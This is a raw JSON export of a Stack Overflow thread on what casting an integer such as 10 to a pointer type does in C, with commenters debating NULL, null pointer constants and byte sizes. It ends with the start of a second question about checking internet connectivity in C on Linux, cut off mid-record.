"profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "edited": false, "score": 1, "creation_date": 1497985580, "post_id": 44660529, "comment_id": 76307743, "body": "@PatrickRoberts: The linked code golf invokes UB and is plain rubbish code. Writing such code is a good reason to get instantly fired. It is undebugable. Don&#39;t even think about writing such code for a program you intend to use practically."}, {"owner": {"reputation": 39159, "user_id": 1541563, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/U4EOh.png?s=128&g=1", "display_name": "Patrick Roberts", "link": "https://stackoverflow.com/users/1541563/patrick-roberts"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497985611, "post_id": 44660529, "comment_id": 76307757, "body": "@Olaf I never said it was a standard, you inferred that. And sure it&#39;s implementation defined, but in at least two compilers on multiple linux platforms, it follows the behavior I described. Anyone with even a little C experience would know not to <i>actually</i> do this, but I personally find it more interesting to observe what some implementations do with this in practice rather than just saying &quot;oh, it&#39;s implementation-dependent / UB&quot;"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 121127, "user_id": 388520, "user_type": "registered", "accept_rate": 51, "profile_image": "https://www.gravatar.com/avatar/dd7cc06b1b1c347e172c6ba532937173?s=128&d=identicon&r=PG", "display_name": "zwol", "link": "https://stackoverflow.com/users/388520/zwol"}, "edited": false, "score": 2, "creation_date": 1497985708, "post_id": 44660529, "comment_id": 76307816, "body": "@zwol: Good statement, but &quot;It doesn&#39;t matter which one&quot; is problematic. 1) chaces are gfood the library has K&amp;R-C Rev. <b>1</b> on the shelf. 2) There are also newer books which teach bad practice and are plain wron in some aspect. Especially when it comes to pointers, etc. there is a lot of &quot;it works for me, so it is correct&quot; voodoo."}, {"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1497986012, "post_id": 44660529, "comment_id": 76307983, "body": "@olaf it says that NULL evaluates to a null pointer constant.  It also says that (void*)0 is a null pointer constant. So &quot;NULL is equivalent to (void*)0&quot; is a reasonable/accurate statement, other than superficial lexical considerations."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 1, "creation_date": 1497986157, "post_id": 44660529, "comment_id": 76308059, "body": "@OliverCharlesworth: Not really. The <code>NULL</code> macro can be as well <code>#define NULL 0</code> - perfectly valid. Or it could be a compiler-internal token/builtin. I&#39;ll already don&#39;t mention the more subtle differences."}, {"owner": {"reputation": 251753, "user_id": 129570, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/aa98a2c5baceef5ffcaf95fdde12b8fb?s=128&d=identicon&r=PG", "display_name": "Oliver Charlesworth", "link": "https://stackoverflow.com/users/129570/oliver-charlesworth"}, "edited": false, "score": 1, "creation_date": 1497986413, "post_id": 44660529, "comment_id": 76308200, "body": "Yes, really, in the sense that most people would interpret &quot;equivalent&quot; in this context (pointers), as opposed to &quot;identical&quot;, say."}, {"owner": {"reputation": 21009, "user_id": 1896169, "user_type": "registered", "accept_rate": 98, "profile_image": "https://i.stack.imgur.com/jap8U.png?s=128&g=1", "display_name": "Justin", "link": "https://stackoverflow.com/users/1896169/justin"}, "edited": false, "score": 1, "creation_date": 1497987445, "post_id": 44660529, "comment_id": 76308812, "body": "The expression <code>(int*)10</code> is meaningless in almost all cases, and it is not valid to evaluate such a pointer. It would be Undefined Behaviour to dereference such a pointer. Unless you are using a compiler that explicitly tells you this is okay and what it means, it has no valid meaning and should be avoided. In other words, only do this if you know exactly what it does (which varies based on the system)"}, {"owner": {"reputation": 5543, "user_id": 6372809, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/O11k5.jpg?s=128&g=1", "display_name": "ilkkachu", "link": "https://stackoverflow.com/users/6372809/ilkkachu"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1497988809, "post_id": 44660529, "comment_id": 76309581, "body": "@Olaf, I believe an int has to be 16 bits at minimum, so it can&#39;t really fit in a byte in the sense that the word is nowadays used."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 5543, "user_id": 6372809, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/O11k5.jpg?s=128&g=1", "display_name": "ilkkachu", "link": "https://stackoverflow.com/users/6372809/ilkkachu"}, "edited": false, "score": 1, "creation_date": 1497989486, "post_id": 44660529, "comment_id": 76309958, "body": "@ilkkachu: That&#39;s wrong. A byte never has nor does it imply 8 bits. That&#39;s the reason all networking RFCs and other documents use the term &quot;octet&quot;. The C standard also does not require a byte to have 8 bits. That&#39;s why <code>CHAR_BIT</code> exists. And there are still quite some systems with 16, 24 or 32 bits per byte. Please keep in mind code like the one in the question is typically used on embedded systems, such architectures are typically. POSIX systems OTOH require <code>CHAR_BIT == 1</code>, but on these dereferencing <code>(int *)10</code> definitively invokes UB in user-space (and most likely in kernel space, too)."}, {"owner": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1497990250, "post_id": 44660529, "comment_id": 76310340, "body": "@Olaf Posix mandates CHAR_BIT == 8, not 1.  UINT_MAX is required to be at least 2^16 - 1.  So, an unsigned requires at least 16 bits in its representation.  I agree with your point about bytes not being universally defined as 8 bits, although that is the most common meaning."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "reply_to_user": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "edited": false, "score": 0, "creation_date": 1497990641, "post_id": 44660529, "comment_id": 76310550, "body": "@jschultz410: You did notrice that was a typo, did you? <code>2 ^ 16 == 18</code>, btw. I agree <code>byte == octet</code> is quite common. So are many missconcceptions, e.g. &quot;the climate does not change&quot;, &quot;earth is a disc&quot;, &quot;atoms are the smallest particles&quot;. Draw your own conclusions \u2026"}, {"owner": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1497991114, "post_id": 44660529, "comment_id": 76310841, "body": "@Olaf Yes, I did &quot;notrice.&quot;  That&#39;s why I posted a correction.  No, I didn&#39;t mean XOR, I meant exponentiation.  My free form comment is not compilable C code, but it does at least contain correct information."}, {"owner": {"reputation": 290304, "user_id": 187690, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/89a4da7af5bf1558b7d2704309f1f118?s=128&d=identicon&r=PG", "display_name": "AnT", "link": "https://stackoverflow.com/users/187690/ant"}, "edited": false, "score": 1, "creation_date": 1497991911, "post_id": 44660529, "comment_id": 76311243, "body": "In C null is not &quot;equavalent&quot; to <code>(void *) 0</code>. <code>(void *) 0</code> is just one possible way to define null pointer constant. You can also define it as plain <code>0</code>. So, it does not &quot;need to be typecasted to <code>void *</code>&quot; as you seem to incorrectly believe."}, {"owner": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "edited": false, "score": 1, "creation_date": 1497992172, "post_id": 44660529, "comment_id": 76311365, "body": "@BabyboBNukes NULL is often defined as (void*) 0 so that if you compare NULL to an integer or a floating point, for example, you will (usually) get a type mismatch warning that you are probably doing something wrong.  If/when NULL is simply defined as 0, then you would likely not get any warning if you compared NULL against number types."}], "answers": [{"comments": [{"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "edited": false, "score": 0, "creation_date": 1497991744, "post_id": 44661715, "comment_id": 76311156, "body": "Here&#39;s another example where it&#39;s used: Perl extensions written in C often need to deal with handles/pointers created by C libraries. Those pointers need to be converted to something that exists in Perl land, so they&#39;re converted into integers (inside of Perl objects of the extension&#39;s class), to be converted by to pointers and used by later calls to the C library."}, {"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 2652, "user_id": 4564515, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/90733097a656c664a472c437678aad42?s=128&d=identicon&r=PG&f=1", "display_name": "jschultz410", "link": "https://stackoverflow.com/users/4564515/jschultz410"}, "edited": false, "score": 1, "creation_date": 1497992169, "post_id": 44661715, "comment_id": 76311363, "body": "@jschultz410, Thanks for the fixes, but please don&#39;t impose your <a href=\"https://stackoverflow.com/q/6990726/589924\">personal style</a> on other people."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 1, "creation_date": 1497993022, "post_id": 44661715, "comment_id": 76311780, "body": "Something to think about (please don&#39;t reply, I don&#39;t want to start a style war): <code>int *p, i</code> - <code>*p is a declarator, the </code>*` gramatically <b>and semantically</b> belongs to the <code>p</code>, not the type specifier. Hence <code>int* p, i;</code> would be visually missleading. Although syntactically irrelevant, especially for beginners such details are irritating (actually not only for beginners)."}, {"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498006992, "post_id": 44661715, "comment_id": 76315847, "body": "@Olaf, I fully agree that declaring more than one var at a time is a bad idea if one is a pointer."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498007621, "post_id": 44661715, "comment_id": 76315971, "body": "@ikegami: That&#39;s like using a horse to pull a car to safe fuel instead of using a carriage (which is more appropriate when using a horse). It is perfectly valid and the common syntax very well supports it visually."}, {"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 116557, "user_id": 918959, "user_type": "registered", "accept_rate": 89, "profile_image": "https://www.gravatar.com/avatar/b9051b2917c3d55d55b3d7042fa49f6c?s=128&d=identicon&r=PG", "display_name": "Antti Haapala", "link": "https://stackoverflow.com/users/918959/antti-haapala"}, "edited": false, "score": 0, "creation_date": 1498012160, "post_id": 44661715, "comment_id": 76317016, "body": "@Antti Haapala, When replying to a comment showing the presence of two valid views, it doesn&#39;t make sense to point that one of those two views exists. You really should read the top answer of the question I linked."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498038747, "post_id": 44661715, "comment_id": 76329468, "body": "@ikegami: As you are a high rep user, I don&#39;t assume you are missreading my comments. So I assume you are kidding. It is quite obvious what I mean: <code>int* p</code> (omitting the second declarator for clarity) is visually missleading as it does not represent the grammatically and semantical structure. It also differs from the normal usage lateron: <code>*p</code>."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498055887, "post_id": 44661715, "comment_id": 76342474, "body": "@ikegami: It sems you did not understand my comments. My reasoning is based on the standard. Maybe reading the standard help."}, {"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1498055913, "post_id": 44661715, "comment_id": 76342499, "body": "@Olaf, Wait, you&#39;re saying that <code>int* p;</code> alone is visually misleading? Not at all!! There&#39;s no possible confusion as to what it allocates. It allocates a pointer to an integer, and that pointer is called <code>p</code>."}, {"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1498057465, "post_id": 44661715, "comment_id": 76343854, "body": "It&#39;s been 20 minutes, and I can&#39;t even fathom what other effect the reader could be fooled into thinking <code>int* p;</code> does."}, {"owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1498114143, "post_id": 44661715, "comment_id": 76367441, "body": "Re &quot;<i>My reasoning is based on the standard</i>&quot;, Your choice of style, you mean. Mine is based on readability. /// Re &quot;<i>Maybe reading the standard help.</i>&quot;, No, I aware of why you chose to code the way you do. As I pointed out in the comment that elicited your first reply, it&#39;s a perfectly legit way of doing things.  I just think readability is more important."}], "tags": [], "owner": {"reputation": 320781, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": -1, "last_activity_date": 1498018680, "last_edit_date": 1498018680, "creation_date": 1497987640, "answer_id": 44661715, "question_id": 44660529, "link": "https://stackoverflow.com/questions/44660529/what-is-happening-when-casting-to-a-pointer-type-in-c/44661715#44661715", "title": "What is happening when casting to a pointer type in C?", "body": "<p>A pointer is a short arrangement of bytes. Via a cast, C allows to pretend these bytes represent an integer.</p>\n\n<pre><code>Type* p = ...;\nintptr_t i = (intptr_t)p;\n</code></pre>\n\n<p>This is occasionally (but rarely) useful when you need to pass a pointer to an interface expecting an integer. To recover the pointer, one just reverses the cast.</p>\n\n<pre><code>Type* recovered_p = (Type*)i;\n</code></pre>\n\n<p>This does not allocate any memory. You can only deference <code>recovered_p</code> if <code>i</code> contain bytes that, if treated as a <code>Type*</code>, references a previously allocated <code>Type</code> value. This means that the following doesn't produce a usable pointer:</p>\n\n<pre><code>int *p = (int*)10;\n</code></pre>\n\n<hr>\n\n<p>An example that uses an integer to store a pointer.</p>\n\n<pre><code>typedef void (*Visitor)(intptr_t, ListNode*);\n\nvoid List_visit(List* list, Visitor visitor, intptr_t arg) {\n   for (ListNode* node = list-&gt;head; node; node=node-&gt;next) {\n      visitor(arg, node);\n   }\n}\n\nvoid printer(intptr_t arg, ListNode* node) {\n   State* state = (intptr_t)arg;\n   printf(\"%*s%s\\n\", ( state-&gt;count++ )*2, \"\", node-&gt;value);\n}\n\nint main(void) {\n   List* list = ...;\n   State* state = ...;\n   List_visit(list, printer, (intptr_t)state);\n   List_free(list);\n   State_free(state);\n   return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497989617, "post_id": 44662113, "comment_id": 76310014, "body": "<code>char *cp = (int *)10;</code> - no typo?"}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497992282, "post_id": 44662113, "comment_id": 76311415, "body": "&quot;\u2026 or (2) change the interpretation of a value&quot; - Actually no. It is always a conversion. C has no <code>reinterpret_cast</code> like C++ introduced. The typical reinterpretation via pointer-cast invokes undefined behaviour (of which alignment is the lesat of problems) with few exceptions. hence the explicit allowancce to alias via a <code>union</code> - because that&#39;s the only legal way. Also <i>null pointers</i> are not neccessarily a single value; One alternative would be to set a bit in the pointer (which could help debugging code quite a lot actually)."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "reply_to_user": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497996783, "post_id": 44662113, "comment_id": 76313252, "body": "@Olaf On the vast majority of popular machines, <code>char *cp = (char *)ip</code> doesn&#39;t change any bits when going from <code>ip</code> to <code>cp</code>, which is of course what I meant by not converting."}, {"owner": {"reputation": 11381, "user_id": 4774918, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/kQQAl.jpg?s=128&g=1", "display_name": "too honest for this site", "link": "https://stackoverflow.com/users/4774918/too-honest-for-this-site"}, "edited": false, "score": 0, "creation_date": 1497997014, "post_id": 44662113, "comment_id": 76313318, "body": "That still is a conversion: 6.3.2.3p7 and related. Whether bits are changed or not is not relevant. A 1:1 copy is still a conversion."}, {"owner": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1498001736, "post_id": 44662113, "comment_id": 76314683, "body": "And another typo <code>int *ip = (int)10;</code>"}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "reply_to_user": {"reputation": 6882, "user_id": 3403834, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/xpA5S.jpg?s=128&g=1", "display_name": "user58697", "link": "https://stackoverflow.com/users/3403834/user58697"}, "edited": false, "score": 0, "creation_date": 1498008401, "post_id": 44662113, "comment_id": 76316149, "body": "@user58697 Thanks, fixed."}], "tags": [], "owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "is_accepted": false, "score": 4, "last_activity_date": 1498008355, "last_edit_date": 1498008355, "creation_date": 1497989173, "answer_id": 44662113, "question_id": 44660529, "link": "https://stackoverflow.com/questions/44660529/what-is-happening-when-casting-to-a-pointer-type-in-c/44662113#44662113", "title": "What is happening when casting to a pointer type in C?", "body": "<p>There are a couple of ways of answering this.</p>\n\n<p>We say that a pointer value is the address of a memory location.  But different computers have used different addressing schemes for memory.  C is a higher-level language, portable across many kinds of computers.  C does not mandate a particular memory architecture.  As far as the C programming language is concerned, memory addresses could literally be things like \"123 Fourth Ave.\", and it's hard to imagine converting back and forth between an integer and an address like that.</p>\n\n<p>Now, for any machine you're likely to use, memory is actually linearly addressed in a reasonably straightforward and unsurprising way.  If your program has 1,000 bytes of memory available to it, the addresses of those bytes might range from 0 up to 999.  So if you say</p>\n\n<pre><code>char *cp = (char *)10;\n</code></pre>\n\n<p>you're just setting up a pointer to the byte located at address 10 (or, that is, the 11th byte in your program's address space).</p>\n\n<p>Now, in C, a pointer is not just the raw address of some location in memory.  In C, a pointer is also declared to specify what type of data it points to.  So if we say</p>\n\n<pre><code>int *ip = (int *)10;\n</code></pre>\n\n<p>we're setting up a pointer to one int's worth of data located at address 10.  It's the same point in memory as <code>cp</code> pointed to, but since it's an int pointer, it's going to access an int's worth of bytes, not one byte like <code>cp</code> did.  If we're on an old 16-bit machine, and int is two bytes, we could think of <code>ip</code> as pointing at the fifth int in our address space.</p>\n\n<p>A cast in C can actually do two things: (1) convert a value (\"change the bits\"), or (2) change the interpretation of a value.  If we say <code>float f = (float)3;</code>, we're converting between the integer representation of 3 and a floating-point representation of 3, which is likely to be quite different.  If we go in the other direction, with something like <code>int i = (int)3.14;</code>, we're also throwing away the fractional part, so there's even more conversion going on.  But if we say <code>int *ip = (int *)10;</code>, we're not really doing anything with the value 10, we're just reinterpreting it as a pointer.  And if we say <code>char *cp = (char *)ip</code>, we're again not changing anything, we're just reinterpreting to a different kind of pointer.</p>\n\n<p>I hasten to add, though, that everything I've said here about pointer conversions is (a) very low-level and machine-dependent, and (b) not the sort of thing that ordinary C programmers are supposed to have to think about during ordinary programming tasks, and (c) not guaranteed by the C language.</p>\n\n<p>In particular, even when programming for a computer with a conventional, linearly-addressed memory model, it's likely that your program doesn't have access to address 10, so these pointers (<code>cp</code> and <code>ip</code>) might be pretty useless, might generate exceptions if you try to use them.  (Also, when we have a pointer like <code>ip</code> that points at more than 1 byte, there's the question of which bytes it points to.  If <code>ip</code> is 10, it probably points at bytes 10 and 11 on a 16-bit, byte-addressed machine, but which of those two bytes is the low-order half of the int and which is the high-order half?  It depends on whether it's a \"big endian\" or \"little endian\" machine.)</p>\n\n<p>But then we come to null pointers.  When you use a constant \"0\" as a pointer value, things are a little different.  If you say</p>\n\n<pre><code>void *p = (void *)0;\n</code></pre>\n\n<p>you are not, strictly speaking, saying \"make <code>p</code> point to address <code>0</code>\".  Instead, you are saying \"make <code>p</code> be a null pointer\".  But it turns out this has nothing to do with the cast, it's because of a special case in the language: in a pointer context, the constant 0 represents a <em>null pointer constant</em>.</p>\n\n<p>A null pointer is a special pointer value that's defined to point nowhere.  It might be represented internally as a pointer to address 0, or it might be represented some other way.  (If it is in fact represented as a pointer to address 0, your compiler will be careful to arrange that there's never any actual data at address 0, so that it's still true that the pointer \"points nowhere\" even though it points to address 0.  This is sort of confusing, sorry about that.)</p>\n\n<p>Although pointers to raw addresses like <code>10</code> are low-level and dangerous and machine-dependent, null pointers are well-defined and perfectly fine.  For example, when you call <code>malloc</code> and it can't give you the memory you asked for, it returns a null pointer to tell you so.  When you test <code>malloc</code>'s return value to see if it succeeded or failed, you just check to see if it gave you a null pointer or not, and there's nothing low-level or nonportable or discouraged about doing so.</p>\n\n<p>See <a href=\"http://c-faq.com/null/index.html\" rel=\"nofollow noreferrer\">http://c-faq.com/null/index.html</a> for much more on all this.</p>\n"}], "owner": {"reputation": 437, "user_id": 6536853, "user_type": "registered", "accept_rate": 16, "profile_image": "https://i.stack.imgur.com/xDvKx.png?s=128&g=1", "display_name": "babybob", "link": "https://stackoverflow.com/users/6536853/babybob"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 326, "favorite_count": 0, "answer_count": 2, "score": -1, "last_activity_date": 1498018680, "creation_date": 1497983271, "last_edit_date": 1497983373, "question_id": 44660529, "link": "https://stackoverflow.com/questions/44660529/what-is-happening-when-casting-to-a-pointer-type-in-c", "title": "What is happening when casting to a pointer type in C?", "body": "<p>I have seen that NULL is the equivalent of <code>(void*)0</code>. But I don't understand why zero needs to be typecasted to <code>void*</code>. And what is really happening under the hood when we do something like this </p>\n\n<pre><code>int *p = (int*)10;\n</code></pre>\n\n<p>Is <code>(int*)</code> extending the address space of integer 10(which take 4 bytes) to 8 bytes in the above statement?</p>\n"}, {"tags": ["c", "linux", "internet-connection"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 4, "creation_date": 1497981490, "post_id": 44660010, "comment_id": 76305244, "body": "&quot;Doesn&#39;t work well&quot; is like taking long coffee breaks or what?"}, {"owner": {"reputation": 37, "user_id": 7974233, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-qjcHwsfv7xM/AAAAAAAAAAI/AAAAAAAAACY/nBIYRI_ByI8/photo.jpg?sz=128", "display_name": "Piyumi Guruge", "link": "https://stackoverflow.com/users/7974233/piyumi-guruge"}, "reply_to_user": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1497981798, "post_id": 44660010, "comment_id": 76305433, "body": "Is there any library functions? (I&#39;m new to network programming)"}, {"owner": {"reputation": 